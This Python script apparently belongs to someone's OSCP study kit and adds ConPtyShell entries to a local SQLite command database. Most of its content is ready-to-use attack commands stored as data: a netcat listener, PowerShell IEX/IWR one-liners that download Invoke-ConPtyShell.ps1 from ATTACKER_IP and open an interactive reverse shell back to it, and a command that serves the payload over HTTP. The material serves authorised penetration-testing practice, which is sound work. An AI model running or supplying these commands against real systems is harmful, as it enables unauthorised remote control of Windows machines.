#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - CONPTYSHELL PATCH     ##
##############################################
Adds ConPtyShell fully interactive Windows shell commands
Usage:
    python3 conptyshell_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "ConPtyShell",
        "description": "Kali listener for ConPtyShell -- MUST use this instead of rlwrap nc, passes terminal size automatically",
        "command": "stty raw -echo; (stty size; cat) | nc -lvnp 3001",
        "category": "shells",
        "tags": "windows,reverse-shell,conptyshell,interactive,listener,powershell"
    },
    {
        "tool": "ConPtyShell",
        "description": "Execute ConPtyShell on Windows target via IEX -- fully interactive PowerShell with tab complete, colors, history",
        "command": "IEX(IWR http://ATTACKER_IP:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER_IP 3001",
        "category": "shells",
        "tags": "windows,reverse-shell,conptyshell,interactive,powershell,iex"
    },
    {
        "tool": "ConPtyShell",
        "description": "Upgrade existing dumb shell to fully interactive ConPtyShell -- use when already have a shell",
        "command": "IEX(IWR http://ATTACKER_IP:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 24 -Cols 80",
        "category": "shells",
        "tags": "windows,reverse-shell,conptyshell,interactive,upgrade,powershell"
    },
    {
        "tool": "ConPtyShell",
        "description": "Execute ConPtyShell from local file -- use when file already transferred to target",
        "command": "IEX(Get-Content .\\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp ATTACKER_IP -RemotePort 3001 -Rows 24 -Cols 80",
        "category": "shells",
        "tags": "windows,reverse-shell,conptyshell,interactive,powershell,local"
    },
    {
        "tool": "ConPtyShell",
        "description": "Get terminal size for ConPtyShell Rows/Cols parameters -- run on Kali before launching",
        "command": "stty size",
        "category": "shells",
        "tags": "windows,reverse-shell,conptyshell,terminal-size,rows,cols"
    },
    {
        "tool": "ConPtyShell",
        "description": "Serve Invoke-ConPtyShell.ps1 from tools directory",
        "command": "cd ~/oscp/tools && python3 -m http.server 8000",
        "category": "shells",
        "tags": "windows,reverse-shell,conptyshell,serve,powershell"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
